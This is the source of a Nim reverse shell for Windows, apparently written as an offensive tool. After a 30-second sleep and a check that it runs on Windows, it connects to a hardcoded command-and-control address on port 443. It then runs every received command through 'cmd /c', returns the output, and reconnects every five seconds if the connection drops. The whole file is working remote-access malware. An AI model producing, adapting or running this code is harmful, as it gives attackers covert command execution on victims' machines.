# Author : Nemuel Wainaina

import os
sleep(30000)

import net
import osproc
import std/strutils

if system.hostOS != "windows":
    system.quit(1)

const
    IP = "10.10.10.3" # set this to your C2 IP Address
    port = 443 # over https :)

var socket = newSocket()
var finalCmd: string

while true:
    try:
        socket.connect(IP, Port(port))

        while true:
            try:
                socket.send("$ ")
                var cmd: string = socket.recvLine()
                
                if cmd == "q" or cmd == "quit":
                    socket.send("[:(] Closing connection ... ")
                    socket.close()
                    system.quit(0) 
                elif contains(cmd, "cd"):
                    if cmd == "cd":
                        socket.send(getCurrentDir() & "\n")
                    else:
                        var tmp = cmd.split(" ")
                        var tgtDir = tmp[tmp.len() - 1]
                        if dirExists(tgtDir):
                            try:
                                setCurrentDir(tgtDir)
                                socket.send("Directory changed to : " & getCurrentDir() & "\n")
                            except:
                                socket.send(getCurrentExceptionMsg() & "\n")
                        else:
                            socket.send("The directory does not exist :( \n")
                else:
                    finalCmd = "cmd /c " & cmd
                    var (result, _) = execCmdEx(finalCmd)
                    socket.send(result)

            except:
                socket.close()
                system.quit(1)
    
    except:
        # reconnect after 5 seconds if connection fails
        sleep(5000)
        continue
